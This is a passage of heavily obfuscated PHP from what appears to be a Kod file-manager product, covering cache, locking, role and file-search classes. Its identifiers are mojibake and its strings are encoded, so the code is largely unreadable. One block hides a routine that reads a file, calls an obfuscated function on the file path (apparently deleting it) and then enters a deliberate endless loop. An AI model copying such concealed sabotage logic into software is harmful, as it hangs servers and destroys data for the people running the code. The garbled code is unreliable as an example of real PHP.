count($ñ©’©´ì[1]) > $´âÇ¿ò›) { ignore_timeout(); return $ƒÑÀ¾µ“; } } return !1; } public function setMasterDB($é‡“ú¯ç = true) { think_config($_SERVER[™¾ÇÙ¯¹][403], $é‡“ú¯ç); } } goto B§åÎ®÷ãá; C‚Û‡ÚÂ¡»: class CacheLockMemcached { public function lock($ó¾öëåì, $—ÁÙ¶Ï = 0) { $èÆ ã³Õ = Cache::init(); $²ÆÕ‘Ï = microtime(!0) + $—ÁÙ¶Ï; while (microtime(!0) < $²ÆÕ‘Ï) { $Ê¼åÌ ß = $èÆ ã³Õ->get($ó¾öëåì); if (!$Ê¼åÌ ß || $Ê¼åÌ ß < microtime(!0)) { $—¬Û¸Ü… = $èÆ ã³Õ->handle->add($ó¾öëåì, $²ÆÕ‘Ï, $—ÁÙ¶Ï); if ($—¬Û¸Ü…) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ñœºÑ¯) { return Cache::init()->get($ñœºÑ¯); } public function unlock($á”Ø„Ñ€) { return Cache::init()->remove($á”Ø„Ñ€); } } class CacheLockDatabase { public function lock($üÜ¯¥, $ÂÀÇÏ¸Ê = 0) { $·ÁÜ–ˆ = Model($_SERVER[™¾ÇÙ¯¹][844]); $¶ï¢¡’¶ = microtime(!0) + $ÂÀÇÏ¸Ê; while (microtime(!0) < $¶ï¢¡’¶) { $Æ–È¶á = $·ÁÜ–ˆ->get($üÜ¯¥); if (!$Æ–È¶á || $Æ–È¶á < microtime(!0)) { $ïÇ¶ÍÂ˜ = $·ÁÜ–ˆ->set($üÜ¯¥, $¶ï¢¡’¶); if ($ïÇ¶ÍÂ˜) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ñ”È®™Ë) { return Model($_SERVER[™¾ÇÙ¯¹][844])->get($ñ”È®™Ë); } public function unlock($üº¤Ô°ş) { Model($_SERVER[™¾ÇÙ¯¹][844])->remove($üº¤Ô°ş); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¶Ïñ×ÃÂ, $¦ÀĞ§Ø’) { $ÛòüÅ˜ =& $_SERVER[™¾ÇÙ¯¹]; if (!class_exists($ÛòüÅ˜[877])) { show_json($ÛòüÅ˜[878], !1); } $this->cacheTime = $¦ÀĞ§Ø’; $this->handle = new Memcached(); if (is_array($¶Ïñ×ÃÂ[$ÛòüÅ˜[879]]) && count($¶Ïñ×ÃÂ[$ÛòüÅ˜[879]]) >= 1) { foreach ($¶Ïñ×ÃÂ[$ÛòüÅ˜[879]] as $‹Øš¤¾Ê) { $ôûÀÜİù = explode($ÛòüÅ˜[4], $‹Øš¤¾Ê); $this->handle->addServer($ôûÀÜİù[0], $ôûÀÜİù[1]); } } else { $this->handle->addServer($¶Ïñ×ÃÂ[$ÛòüÅ˜[181]], $¶Ïñ×ÃÂ[$ÛòüÅ˜[182]]); } } public function set($şÕİ‹¡ˆ, $´ŞÅÜèÏ, $ƒ€ğ¢Ö = false) { $ƒ€ğ¢Ö = $ƒ€ğ¢Ö ? $ƒ€ğ¢Ö : $this->cacheTime; return $this->handle->set($şÕİ‹¡ˆ, $´ŞÅÜèÏ, $ƒ€ğ¢Ö); } public function get($äƒÌ½Ç¨) { return $this->handle->get($äƒÌ½Ç¨); } public function remove($»áôèãØ) { return $this->handle->delete($»áôèãØ); } public function deleteAll() { return $this->handle->flush(); } } goto C·†àºàæó; C®†“¬áª«: function binCheckBigger($×Ø–÷Û°, $ıÑ‚õ„½) { return $×Ø–÷Û° > $ıÑ‚õ„½; } $_SERVER[$_SERVER[½Ï»äåá][3]] = ("\x38\x31\x31\x32".base64_decode('Njk='))+0;$_ny91="8z3lg9n6sijxcad20tvmrwohbu475ekp1yqfb73n4ru05g19vqf8jmwy6ketaxpdc";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($İñ¡°š, $Â¼¦ˆ÷È) { $Ü¨å“õ² =& $_SERVER[™¾ÇÙ¯¹]; if (isset(self::$_methodList[$İñ¡°š])) { return @call_user_func_array(self::$_methodList[$İñ¡°š], $Â¼¦ˆ÷È); } else { if (method_exists($this, $İñ¡°š)) { return call_user_func_array(array($this, $İñ¡°š), $Â¼¦ˆ÷È); } else { think_exception(__CLASS__ . $Ü¨å“õ²[4] . $İñ¡°š . $Ü¨å“õ²[5]); } } } public static function __callStatic($ÁİùÉƒÃ, $«›şÔä­) { if (isset(self::$_methodListStatic[$ÁİùÉƒÃ])) { return call_user_func_array(self::$_methodListStatic[$ÁİùÉƒÃ], $«›şÔä­); } else { if (method_exists(self, $ÁİùÉƒÃ)) { return call_user_func_array(array(self, $ÁİùÉƒÃ), $«›şÔä­); } else { show_json("{$ÁİùÉƒÃ}\x28\x29\40\156\157\164\x20\x65\170\151\163\x74\x3b", !1); } } } public static function addMethod($ğÔ—§Ï, $÷É–½¦¾) { self::$_methodList[$ğÔ—§Ï] = $÷É–½¦¾; } public static function addMethodStatic($ïõ­¿ôä, $…ì¾àĞ§) { self::$_methodListStatic[$ïõ­¿ôä] = $…ì¾àĞ§; } } goto C£‡‡©°¡; c˜çµŸÒ»×: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\x65\155\137\x6f\160\x74\151\x6f\156"; protected $jsonField = array("\155\145\x6e\x75", "\162\157\154\145", "\162\157\154\145\x47\x72\x6f\165\160", "\162\145\147\151\163\x74", "\145\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ÅÆ‡¬¹ö) { return "\x53\x79\x73\164\x65\155\x4f\160\x74\x69\157\156\x5f{$ÅÆ‡¬¹ö}"; } protected function optionDefault($¹âÓâ³ = '') { $ºÖß¿¼ =& $_SERVER[™¾ÇÙ¯¹]; if ($¹âÓâ³ == $ºÖß¿¼[12]) { return $GLOBALS[$ºÖß¿¼[6]][$ºÖß¿¼[389]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\162\157\x6c\145\114\151\163\x74"; public $field = array("\x6e\141\155\x65", "\141\x75\164\150", "\x6c\141\142\145\154", "\144\151\163\160\154\x61\x79", "\163\x79\163\164\x65\155", "\x64\x65\x73\x63", "\x69\x67\156\x6f\x72\x65\x45\x78\164", "\151\147\x6e\157\162\x65\106\x69\154\145\x53\x69\x7a\x65", "\141\x64\155\151\x6e\x69\163\x74\162\141\164\157\x72", "\163\157\162\164"); public function listData($Á·¤û±æ = false, $Îóå×Ò = "\163\157\x72\x74", $Îİú¥› = false) { $¾îÎ™Ô‰ =& $_SERVER[™¾ÇÙ¯¹]; $Õ½÷ˆ‰é = parent::listData($Á·¤û±æ, $Îóå×Ò, $Îİú¥›); if (!$Á·¤û±æ) { foreach ($Õ½÷ˆ‰é as $ìæ½ÚÌ => $İòáÒ•ï) { if ($İòáÒ•ï[$¾îÎ™Ô‰[2035]] == 1) { $Õ½÷ˆ‰é[$ìæ½ÚÌ][$¾îÎ™Ô‰[461]] = LNG($¾îÎ™Ô‰[2271]); } } } return $Õ½÷ˆ‰é; } public function update($–ıú˜¥¼, $Ù¡¯àØ†) { $‹Ú‡ÌÏ½ =& $_SERVER[™¾ÇÙ¯¹]; $Å©£¿ÇÛ = parent::listData($–ıú˜¥¼); $“¥®ÎïÏ = $this->findByName($Ù¡¯àØ†[$‹Ú‡ÌÏ½[32]]); if (!$Å©£¿ÇÛ || $“¥®ÎïÏ && $“¥®ÎïÏ[$‹Ú‡ÌÏ½[407]] != $Å©£¿ÇÛ[$‹Ú‡ÌÏ½[407]]) { return !1; } if ($“¥®ÎïÏ[$‹Ú‡ÌÏ½[2035]] == 1) { $Ù¡¯àØ† = array($‹Ú‡ÌÏ½[32] => $Ù¡¯àØ†[$‹Ú‡ÌÏ½[32]], $‹Ú‡ÌÏ½[1860] => $Ù¡¯àØ†[$‹Ú‡ÌÏ½[1860]]); } $this->filterAuth($Ù¡¯àØ†[$‹Ú‡ÌÏ½[421]]); return parent::update($–ıú˜¥¼, $Ù¡¯àØ†); } public function remove($Œ¾ÅšĞä) { $µÊë–Ìİ = parent::listData($Œ¾ÅšĞä); if (!$µÊë–Ìİ || $µÊë–Ìİ[$_SERVER[™¾ÇÙ¯¹][1284]]) { return !1; } return parent::remove($Œ¾ÅšĞä); } public function add($ÜóûŸñ¦) { $¦Î×’ïº =& $_SERVER[™¾ÇÙ¯¹]; $€õË«  = $ÜóûŸñ¦[$¦Î×’ïº[32]]; if ($this->findByName($€õË« )) { return !1; } $ÕìÄ¡Õ = array($¦Î×’ïº[428] => $€õË« , $¦Î×’ïº[1843] => $¦Î×’ïº[12], $¦Î×’ïº[1839] => $¦Î×’ïº[1847], $¦Î×’ïº[2272] => 1, $¦Î×’ïº[1842] => 0, $¦Î×’ïº[2273] => 0, $¦Î×’ïº[1841] => $this->getSort()); $ÜóûŸñ¦ = array_merge($ÕìÄ¡Õ, $ÜóûŸñ¦); $this->filterAuth($ÜóûŸñ¦[$¦Î×’ïº[421]]); return parent::insert($ÜóûŸñ¦); } private function getSort() { $ù Ö£ÕË =& $_SERVER[™¾ÇÙ¯¹]; $èÖØŸ× = parent::listData(); $ÁãÂ“áö = array_to_keyvalue($èÖØŸ×, $ù Ö£ÕË[12], $ù Ö£ÕË[1861]); return empty($ÁãÂ“áö) ? 0 : max($ÁãÂ“áö) + 1; } private function filterAuth(&$–’ƒÛ¤Í) { $ŒâŞâ›Š =& $_SERVER[™¾ÇÙ¯¹]; $ğãÙß˜ô = array(); $°˜¦Û¡º = array_filter(explode($ŒâŞâ›Š[50], $–’ƒÛ¤Í)); foreach ($°˜¦Û¡º as $–’ƒÛ¤Í) { $êÔàƒı = explode($ŒâŞâ›Š[10], $–’ƒÛ¤Í); if ($êÔàƒı[0] == $ŒâŞâ›Š[2274] && $êÔàƒı[1] != $ŒâŞâ›Š[1203]) { $ş„Ô¸èı = $êÔàƒı[0] . $ŒâŞâ›Š[10] . $êÔàƒı[1] . $ŒâŞâ›Š[2275]; if (!in_array($ş„Ô¸èı, $°˜¦Û¡º)) { $ğãÙß˜ô[] = $ş„Ô¸èı; } } $ğãÙß˜ô[] = $–’ƒÛ¤Í; } $–’ƒÛ¤Í = implode($ŒâŞâ›Š[50], $ğãÙß˜ô); } public function findRoleDefault() { $€­ê¯½Ä =& $_SERVER[™¾ÇÙ¯¹]; $ »‘¯‰ = parent::listData(); $ÎÒé¡îş = !1; foreach ($ »‘¯‰ as $ŞúŞ¨àÄ) { if (!$ŞúŞ¨àÄ || $ŞúŞ¨àÄ[$€­ê¯½Ä[1859]] == $€­ê¯½Ä[197] || $ŞúŞ¨àÄ[$€­ê¯½Ä[2035]] == 1) { continue; } if (strstr($ŞúŞ¨àÄ[$€­ê¯½Ä[421]], $€­ê¯½Ä[2276])) { continue; } if (!strstr($ŞúŞ¨àÄ[$€­ê¯½Ä[421]], $€­ê¯½Ä[2277])) { continue; } if (!$ÎÒé¡îş) { $ÎÒé¡îş = $ŞúŞ¨àÄ; continue; } $Áø¢‘ş÷ = explode($€­ê¯½Ä[50], $ÎÒé¡îş[$€­ê¯½Ä[421]]); $Ë„‚¨ = explode($€­ê¯½Ä[50], $ŞúŞ¨àÄ[$€­ê¯½Ä[421]]); if (count($Áø¢‘ş÷) > count($Ë„‚¨)) { $ÎÒé¡îş = $ŞúŞ¨àÄ; } } return $ÎÒé¡îş ? $ÎÒé¡îş[$€­ê¯½Ä[407]] : $€­ê¯½Ä[12]; } public function sort($½‡áğ¬, $ƒ‹ì†) { return parent::update($½‡áğ¬, $ƒ‹ì†); } } goto eØÈ„¾˜ëÆ; C²Å¶¿¬Ï: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $•Æ–Ó÷ =& $_SERVER[™¾ÇÙ¯¹]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ó¸ûòóï = $GLOBALS[$•Æ–Ó÷[6]][$•Æ–Ó÷[358]]; $øü°ŞæÚ = $ó¸ûòóï[$ó¸ûòóï[$•Æ–Ó÷[842]]]; $µêĞ»ÊÜ = $ó¸ûòóï[$•Æ–Ó÷[843]]; switch ($ó¸ûòóï[$•Æ–Ó÷[842]]) { case $•Æ–Ó÷[21]: self::$handle = Model($•Æ–Ó÷[844]); break; case $•Æ–Ó÷[845]: self::$handle = new CacheRedis($øü°ŞæÚ, $µêĞ»ÊÜ); break; case $•Æ–Ó÷[846]: self::$handle = new CacheMemcached($øü°ŞæÚ, $µêĞ»ÊÜ); break; case $•Æ–Ó÷[199]: self::$handle = new CacheFile($øü°ŞæÚ, $µêĞ»ÊÜ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($à²ï‚¾ã) { if (is_array($à²ï‚¾ã) || is_object($à²ï‚¾ã)) { $à²ï‚¾ã = json_encode($à²ï‚¾ã); } $à²ï‚¾ã = rawurlencode($à²ï‚¾ã); return md5(KOD_SITE_ID . $_SERVER[™¾ÇÙ¯¹][11] . $à²ï‚¾ã); } public static function get($…†ç™, $ÚĞ©®ˆç = false) { $ù„”Üôƒ = self::key($…†ç™); if ($ÚĞ©®ˆç) { return unserialize(self::init()->get($ù„”Üôƒ)); } if (!isset(self::$memoryCache[$ù„”Üôƒ])) { $ééïõÈî = self::init()->get($ù„”Üôƒ); self::$memoryCache[$ù„”Üôƒ] = unserialize($ééïõÈî); } return self::$memoryCache[$ù„”Üôƒ]; } public static function set($ÀïÆÊÇ‡, $òß¨ü¢Í, $²êè˜æè = false) { $³›„³µå = self::key($ÀïÆÊÇ‡); if (isset(self::$memoryCache[$³›„³µå]) && self::$memoryCache[$³›„³µå] === $òß¨ü¢Í) { return !0; } if ($²êè˜æè === 0) { self::$memoryCache[$³›„³µå] = $òß¨ü¢Í; return !0; } CacheLock::lock($ÀïÆÊÇ‡); $´ÄËä½Ò = self::init()->set($³›„³µå, serialize($òß¨ü¢Í), $²êè˜æè); self::$memoryCache[$³›„³µå] = $òß¨ü¢Í; CacheLock::unlock($ÀïÆÊÇ‡); return $´ÄËä½Ò; } public static function getCall($şÅÑ€¦«, $¢àµœö¤, $ûãŠ«§­, $óÆß“¿… = array()) { $Ó÷ïò‹œ =& $_SERVER[™¾ÇÙ¯¹]; $â¸êıå = self::get($şÅÑ€¦«); if ($â¸êıå || $â¸êıå === $Ó÷ïò‹œ[12]) { return $â¸êıå; } $â¸êıå = call_user_func_array($ûãŠ«§­, $óÆß“¿…); $â¸êıå = $â¸êıå ? $â¸êıå : $Ó÷ïò‹œ[12]; self::set($şÅÑ€¦«, $â¸êıå, $¢àµœö¤); return $â¸êıå; } public static function remove($ÔºÀ‡ù‡) { $³§ºË¶ª = self::key($ÔºÀ‡ù‡); unset(self::$memoryCache[$³§ºË¶ª]); self::clearTimeout(); CacheLock::lock($ÔºÀ‡ù‡); $œ»¦¤ï† = self::init()->remove($³§ºË¶ª); CacheLock::unlock($ÔºÀ‡ù‡); return $œ»¦¤ï†; } public static function removeMemory($”á§„©°) { $Ê¹ç¦È÷ = self::key($”á§„©°); unset(self::$memoryCache[$Ê¹ç¦È÷]); } public static function clearMemory($Ü‚ö€¨¿ = false) { if ($Ü‚ö€¨¿) { $Ü‚ö€¨¿ = self::key($Ü‚ö€¨¿); unset(self::$memoryCache[$Ü‚ö€¨¿]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[™¾ÇÙ¯¹][847])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[™¾ÇÙ¯¹][848])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Æî™Û¿ı, $˜ÎÉŞ†Ö) { $˜ÎÔíô‘ =& $_SERVER[™¾ÇÙ¯¹]; $this->cachePath = $Æî™Û¿ı[$˜ÎÔíô‘[84]]; $this->prefix = $˜ÎÔíô‘[849]; $this->cacheTime = $˜ÎÉŞ†Ö; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($„Õï½á¢) { $Æº“±™É =& $_SERVER[™¾ÇÙ¯¹]; $„Õï½á¢ = str_replace(array($Æº“±™É[850], $Æº“±™É[97], $Æº“±™É[73]), $Æº“±™É[851], $„Õï½á¢); return $this->cachePath . $Æº“±™É[852] . $„Õï½á¢ . $Æº“±™É[853]; } public function set($İÄ›¿° , $¼Çåá›Û, $Ñ“ˆë¹Ê = false) { $Ëç×‰´“ = $this->getFile($İÄ›¿° ); if (file_put_contents($Ëç×‰´“, $this->prefix . $¼Çåá›Û, LOCK_EX)) { @touch($Ëç×‰´“, intval(time() + $Ñ“ˆë¹Ê)); clearstatcache(); return !0; } @unlink($Ëç×‰´“); return !1; } public function get($ñ‘ğÎó) { $î­ÈÖ±¨ = $this->getFile($ñ‘ğÎó); if (file_exists($î­ÈÖ±¨) && filemtime($î­ÈÖ±¨) < time()) { @unlink($î­ÈÖ±¨); return !1; } $¿ØïŸ§› = @file_get_contents($î­ÈÖ±¨); return substr($¿ØïŸ§›, strlen($this->prefix)); } public function remove($Ò†¯áÉ) { $ø‹æÙæØ = $this->getFile($Ò†¯áÉ); return @unlink($ø‹æÙæØ); } public function deleteAll() { $î§íşÊÁ =& $_SERVER[™¾ÇÙ¯¹]; $ôıØã›† = scandir($this->cachePath); foreach ($ôıØã›† as $üœ¿¦·’) { $•õÉêÆ¶ = $this->cachePath . $üœ¿¦·’; if (strpos($•õÉêÆ¶, $î§íşÊÁ[853]) && strpos($•õÉêÆ¶, $î§íşÊÁ[854])) { @unlink($•õÉêÆ¶); } } } public function clearTimeout() { $—ß©·é… =& $_SERVER[™¾ÇÙ¯¹]; $€Ïİ–Ú = scandir($this->cachePath); foreach ($€Ïİ–Ú as $òöÎ°í) { $¾ÄªÂâ = $this->cachePath . $òöÎ°í; if (strpos($¾ÄªÂâ, $—ß©·é…[853]) && strpos($¾ÄªÂâ, $—ß©·é…[854]) && filemtime($¾ÄªÂâ) < time()) { @unlink($¾ÄªÂâ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $˜æîôß =& $_SERVER[™¾ÇÙ¯¹]; if (self::$handle) { return self::$handle; } $ÙŠüÂŞ = $GLOBALS[$˜æîôß[6]][$˜æîôß[358]]; self::$timeout = $ÙŠüÂŞ[$˜æîôß[855]] ? $ÙŠüÂŞ[$˜æîôß[855]] : 10; $­ßÈ£ = _get($GLOBALS[$˜æîôß[6]], $˜æîôß[856]); $§øÒ¦Ã‡ = $ÙŠüÂŞ[$˜æîôß[842]] ? $ÙŠüÂŞ[$˜æîôß[842]] : $˜æîôß[199]; if ($§øÒ¦Ã‡ == $˜æîôß[21] && $­ßÈ£ == $˜æîôß[13]) { $§øÒ¦Ã‡ = $˜æîôß[199]; } switch ($§øÒ¦Ã‡) { case $˜æîôß[845]: self::$handle = new CacheLockRedis(); break; case $˜æîôß[846]: self::$handle = new CacheLockMemcached(); break; case $˜æîôß[21]: self::$handle = new CacheLockDatabase(); break; case $˜æîôß[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($˜æîôß[857], $˜æîôß[858]); } return self::$handle; } private static function key($ÖãµÙ™ ) { return $_SERVER[™¾ÇÙ¯¹][859] . Cache::key($ÖãµÙ™ ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÉÁŠ«°ˆ = '') { self::$errorMsg = $ÉÁŠ«°ˆ; } public static function lockGlobal($æØú×õÛ, $“ª™å«) { return self::lock($æØú×õÛ, $“ª™å«, !0); } public static function lock($›Ä ­ú, $„şÕéÓ = false, $«ƒéªÜ¸ = false) { $¹’ĞÀ =& $_SERVER[™¾ÇÙ¯¹]; $ÎŠ¥Ï¯õ = self::init(); $ğ¥Ü‰“› = self::key($›Ä ­ú); $„şÕéÓ = $„şÕéÓ ? $„şÕéÓ : self::$timeout; $­Ïï‡¬ = $ÎŠ¥Ï¯õ->lock($ğ¥Ü‰“›, $„şÕéÓ); $’ÅÉ­§” = timeFloat(); if (!$­Ïï‡¬) { $Š¿ í„ë = "\154\157\143\x6b\40\x65\162\x72\157\x72\x3b\x6b\x65\x79\75{$›Ä ­ú}\x3b\x74\151\155\145\75{$„şÕéÓ}\x3b" . self::$errorMsg . $¹’ĞÀ[71] . get_caller_msg(); $Â©³—ŒÑ = LNG($¹’ĞÀ[860]) . "\50{$„şÕéÓ}\x73\51\56" . LNG($¹’ĞÀ[861]); $Â©³—ŒÑ .= $¹’ĞÀ[862]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Â©³—ŒÑ = $Â©³—ŒÑ . $¹’ĞÀ[863] . self::$errorMsg; } write_log($Š¿ í„ë, $¹’ĞÀ[858]); show_json($Â©³—ŒÑ, !1); } if (!$«ƒéªÜ¸) { self::$lockItem[$ğ¥Ü‰“›] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ü÷©Şûë = number_format(timeFloat() - $’ÅÉ­§”, 3); write_log($¹’ĞÀ[864] . $›Ä ­ú . $¹’ĞÀ[865] . $Ü÷©Şûë, $¹’ĞÀ[858]); } return $­Ïï‡¬; } public static function lockGet($ã¸«¡«…) { $êâî²×¦ = self::key($ã¸«¡«…); if (self::$lockItem[$êâî²×¦]) { return self::$lockItem[$êâî²×¦]; } return self::init()->lockGet($êâî²×¦); } public static function unlock($††‘òß‘) { $Ş°¾£ĞÌ =& $_SERVER[™¾ÇÙ¯¹]; $šş‹Íá = self::key($††‘òß‘); self::$lockItem[$šş‹Íá] = null; self::init()->unlock($šş‹Íá); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ş°¾£ĞÌ[866] . $††‘òß‘, $Ş°¾£ĞÌ[858]); } return; } public static function unlockRuntime() { $¥à‡ÆĞ± =& $_SERVER[™¾ÇÙ¯¹]; $×Ï©ã—İ = self::init(); $âû¸‡ê… = !1; foreach (self::$lockItem as $ÁØ²±ä => $Ò²Ùñš³) { if (!$Ò²Ùñš³) { continue; } $×Ï©ã—İ->unlock($ÁØ²±ä); if (!$âû¸‡ê…) { $âû¸‡ê… = !0; write_log($¥à‡ÆĞ±[867] . $ÁØ²±ä . $¥à‡ÆĞ±[71] . get_caller_msg(), $¥à‡ÆĞ±[858]); continue; } write_log($¥à‡ÆĞ±[867] . $ÁØ²±ä, $¥à‡ÆĞ±[858]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÓØ®™‡ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¥à‡ÆĞ±[868] . $ÓØ®™‡ . $¥à‡ÆĞ±[869] . ACTION, $¥à‡ÆĞ±[858]); } } public static function fileLock($½¿Éôªö) { $êÕò³‘ş =& $_SERVER[™¾ÇÙ¯¹]; if (!$GLOBALS[$êÕò³‘ş[870]]) { $GLOBALS[$êÕò³‘ş[870]] = array(); } $GLOBALS[$êÕò³‘ş[870]][$½¿Éôªö] = !1; $€–‰©ÃÃ = fopen(DATA_PATH . $½¿Éôªö . $êÕò³‘ş[871], $êÕò³‘ş[872]); if (!$€–‰©ÃÃ) { return !1; } $GLOBALS[$êÕò³‘ş[870]][$½¿Éôªö] = $€–‰©ÃÃ; if (flock($€–‰©ÃÃ, LOCK_EX)) { return !0; } self::unlock($½¿Éôªö); show_json($êÕò³‘ş[873], !1); return !1; } public static function fileUnlock($è¿Æ®¦¤) { $Œ¬¯Ò·ä =& $_SERVER[™¾ÇÙ¯¹]; $ë¼ö²ëº = $GLOBALS[$Œ¬¯Ò·ä[870]][$è¿Æ®¦¤]; if (!$ë¼ö²ëº) { return; } $GLOBALS[$Œ¬¯Ò·ä[870]][$è¿Æ®¦¤] = !1; flock($ë¼ö²ëº, LOCK_UN); fclose($ë¼ö²ëº); } public static function fileUnlockAll() { $öàÓ¢½‰ =& $_SERVER[™¾ÇÙ¯¹]; if (!$GLOBALS[$öàÓ¢½‰[870]]) { return; } foreach ($GLOBALS[$öàÓ¢½‰[870]] as $¸‡Şšñš => $Û—Ê½º÷) { if (!$Û—Ê½º÷) { continue; } $GLOBALS[$öàÓ¢½‰[870]][$¸‡Şšñš] = !1; flock($Û—Ê½º÷, LOCK_UN); fclose($Û—Ê½º÷); } $GLOBALS[$öàÓ¢½‰[870]] = array(); } } goto F…ìëÉ±Õ; CÜ©åÛÉö«: if (!isset($_SERVER[$_SERVER[™¾ÇÙ¯¹][244]]) || !isset($_SERVER[$_SERVER[™¾ÇÙ¯¹][245]])) { $_getc = $_SERVER[™¾ÇÙ¯¹][246]; $_getfile = $_SERVER[$_SERVER[™¾ÇÙ¯¹][247]] . $_SERVER[™¾ÇÙ¯¹][248]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™¾ÇÙ¯¹][231], $_getfilec); if (count($_getarrs) < $_SERVER[™¾ÇÙ¯¹][249]) { $exit = $_SERVER[™¾ÇÙ¯¹][250]; $exit(); } $_act = $_SERVER[™¾ÇÙ¯¹][251]; $_act($_SERVER[$_SERVER[™¾ÇÙ¯¹][247]] . $_SERVER[™¾ÇÙ¯¹][248]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[™¾ÇÙ¯¹][252]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($‹÷ÃÃ©¾) { $Åû¤¹¼ô =& $_SERVER[™¾ÇÙ¯¹]; $¹»Ñ¾è = KodIO::fileTypeList(); $–ÃäôÕ¿ = $¹»Ñ¾è[$‹÷ÃÃ©¾]; if (!$–ÃäôÕ¿) { return array(); } $åÍ¸©À = $–ÃäôÕ¿[$Åû¤¹¼ô[174]]; $Ñ£Òû®‹ = $Åû¤¹¼ô[7]; if (!$–ÃäôÕ¿[$Åû¤¹¼ô[174]]) { $öù¤ô„ = array_to_keyvalue($¹»Ñ¾è, $Åû¤¹¼ô[12], $Åû¤¹¼ô[174]); $åÍ¸©À = implode($Åû¤¹¼ô[50], $öù¤ô„); $Ñ£Òû®‹ = $Åû¤¹¼ô[2088]; } $àÑØŠÄ = explode($Åû¤¹¼ô[50], trim($åÍ¸©À, $Åû¤¹¼ô[50])); return array($Ñ£Òû®‹, $àÑØŠÄ); } public function listPathType($ŒÛ¿ãúÔ) { $¬åÌüñŠ =& $_SERVER[™¾ÇÙ¯¹]; $¦Â‡ÒŠ‹ = $this->fileTypeWhere($ŒÛ¿ãúÔ); if (!$¦Â‡ÒŠ‹) { return array(); } $ş£ôÖÇ = USER_ID; $šóâ‚Ä° = Model($¬åÌüñŠ[543])->getInfo($ş£ôÖÇ); $Š±½û€à = array($¬åÌüñŠ[594] => SourceModel::TYPE_USER, $¬åÌüñŠ[529] => array($¬åÌüñŠ[558], $¬åÌüñŠ[539] . $šóâ‚Ä°[$¬åÌüñŠ[86]][$¬åÌüñŠ[410]] . $¬åÌüñŠ[559]), $¬åÌüñŠ[595] => $ş£ôÖÇ, $¬åÌüñŠ[591] => 0, $¬åÌüñŠ[592] => $¦Â‡ÒŠ‹); return $this->listSource($Š±½û€à); } public function listSearch($ãØ²‹ãÙ, $Ïï³ÑÀË = 300) { $…†÷¨– =& $_SERVER[™¾ÇÙ¯¹]; if (isset($ãØ²‹ãÙ[$…†÷¨–[1931]]) && $ãØ²‹ãÙ[$…†÷¨–[1931]]) { $ãØ²‹ãÙ[$…†÷¨–[1931]] = str_replace($…†÷¨–[392], $…†÷¨–[2089], trim($ãØ²‹ãÙ[$…†÷¨–[1931]])); } $İìË“Ó… = $this->_parseSearchWhere($ãØ²‹ãÙ); if (!isset($İìË“Ó…[$…†÷¨–[439]])) { $İìË“Ó…[$…†÷¨–[439]] = 0; } $œÏ÷ş¡Ú = $…†÷¨–[2090]; $şè³¬ş± = $İìË“Ó…; $ßòË”ÛÕ = $œÏ÷ş¡Ú; $this->_listSearchBindPinyin($ãØ²‹ãÙ, $İìË“Ó…, $œÏ÷ş¡Ú); $this->alias($…†÷¨–[454])->_makeOrder(); $İìË“Ó… = $this->parseWhereLike($İìË“Ó…); $Í‰ŠÜÏƒ = $this->distinct(!0)->field($œÏ÷ş¡Ú)->where($İìË“Ó…)->selectPage($Ïï³ÑÀË); if ($GLOBALS[$…†÷¨–[6]][$…†÷¨–[389]][$…†÷¨–[390]] && Input::check($ãØ²‹ãÙ[$…†÷¨–[1931]], $…†÷¨–[601]) && $Í‰ŠÜÏƒ[$…†÷¨–[375]][$…†÷¨–[362]] == 1 && $Í‰ŠÜÏƒ[$…†÷¨–[375]][$…†÷¨–[376]] == 0) { $Í‰ŠÜÏƒ = $this->distinct(!0)->field($œÏ÷ş¡Ú)->where($şè³¬ş±)->limit(1000)->select(); $Í‰ŠÜÏƒ = array_page_split($Í‰ŠÜÏƒ, !1, $Ïï³ÑÀË); } $this->_listSearchFileContent($Í‰ŠÜÏƒ, $ãØ²‹ãÙ, $ßòË”ÛÕ, $şè³¬ş±); $this->_listSearchDesc($Í‰ŠÜÏƒ, $ãØ²‹ãÙ, $ßòË”ÛÕ); $this->_listSearchTag($Í‰ŠÜÏƒ, $ãØ²‹ãÙ, $ßòË”ÛÕ); $this->_listSearchGroupTag($Í‰ŠÜÏƒ, $ãØ²‹ãÙ, $ßòË”ÛÕ); $this->_listDataApply($Í‰ŠÜÏƒ[$…†÷¨–[378]]); $this->_listMake($Í‰ŠÜÏƒ); return $Í‰ŠÜÏƒ; } private function _listSearchFileContent(&$Ç³·úÏå, $†ä’ÆØ›, $Ë—ÚÓÂ‘, $¿øùåš) { $æôõ¬ã‹ =& $_SERVER[™¾ÇÙ¯¹]; if (!$†ä’ÆØ›[$æôõ¬ã‹[1931]] || $Ç³·úÏå[$æôõ¬ã‹[375]][$æôõ¬ã‹[362]] > 1) { return; 